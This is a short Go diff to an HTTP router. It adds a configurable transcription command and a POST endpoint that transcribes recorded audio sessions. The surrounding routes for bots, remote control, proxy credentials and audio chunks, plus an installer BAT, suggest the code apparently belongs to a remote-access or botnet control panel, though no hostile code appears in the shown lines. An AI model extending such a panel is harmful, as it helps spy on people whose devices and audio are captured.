@@ -31,8 +31,9 @@ type Deps struct {
 	// PublicURL overrides request-derived URL inference in update
 	// manifests and the dynamic install BAT. Example:
 	// "https://umbra.acme.example". Optional.
-	PublicURL string
-	Blobs     *blobstore.Store
+	PublicURL     string
+	Blobs         *blobstore.Store
+	TranscribeCmd string
 }
 
 // NewRouter assembles the chi router with all middleware and routes.
@@ -46,7 +47,7 @@ func NewRouter(d Deps) http.Handler {
 	authAPI := &AuthAPI{DB: d.DB, Sessions: d.Sessions, BcryptRounds: d.BcryptRounds}
 	botsAPI := &BotsAPI{DB: d.DB, RPC: d.BotRPC, Hub: d.LiveHub}
 	settingsAPI := &SettingsAPI{DB: d.DB}
-	mediaAPI := &MediaAPI{DB: d.DB, Blobs: d.Blobs}
+	mediaAPI := &MediaAPI{DB: d.DB, Blobs: d.Blobs, Transcribe: d.TranscribeCmd}
 	investigationAPI := &InvestigationAPI{DB: d.DB}
 	remoteAPI := &RemoteAPI{DB: d.DB, RPC: d.BotRPC}
 	proxyAPI := &ProxyCredsAPI{DB: d.DB, RPC: d.BotRPC}
@@ -150,6 +151,7 @@ func NewRouter(d Deps) http.Handler {
 			r.Get("/api/v1/audio-sessions", mediaAPI.AudioSessions)
 			r.Get("/api/v1/audio-session/{session_id}", mediaAPI.AudioSessionMerge)
 			r.Get("/api/v1/audio-session/{session_id}/chunks", mediaAPI.AudioSessionChunks)
+			r.Post("/api/v1/audio-session/{session_id}/transcribe", mediaAPI.AudioSessionTranscribe)
 			r.Get("/api/v1/audio/{id}", mediaAPI.AudioChunk)
 		})
 
